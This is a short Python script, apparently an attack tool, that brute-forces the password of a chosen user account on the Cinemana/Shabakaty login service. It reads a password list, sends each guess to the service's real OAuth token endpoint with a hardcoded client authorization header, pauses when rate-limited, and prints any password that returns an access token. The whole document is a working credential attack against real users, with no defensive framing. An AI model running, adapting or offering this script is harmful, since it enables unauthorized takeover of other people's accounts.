import requests
import os
userLIST = []
usernameLIST = []
u = input("Enter User for attack: ")
usernameLIST.append(u)
listpas = input("Enter password list: ")
passinpot = open(listpas, 'r').readlines()
for line in passinpot:
  a = line.strip()
  headers = {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Authorization': 'Basic TmV3LkNpbmVtYW5hLmlkOlBAc3N3b3Jk',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'Origin': 'https://cinemana.shabakaty.com',
      'DNT': '1',
      'Connection': 'keep-alive',
      'Referer': 'https://cinemana.shabakaty.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
  }

  data = {
    'grant_type': 'password',
    'scope': 'openid earthlink.profile offline_access fileservice',
    'username': u,
    'password': a
  }

  response = requests.post('https://account.shabakaty.com/core/connect/token/', headers=headers, data=data)
  print(response.text)
  if 'Too many !' in response.text:
     print("loading ... .>>>^^^^^^")
     time.sleep(100)
     print(a)
  if 'access_token' in response.text:
      os.system("clear")
      userLIST.append(a)
      print("USER  ",usernameLIST)
      print("PASS FUONDD  ",userLIST)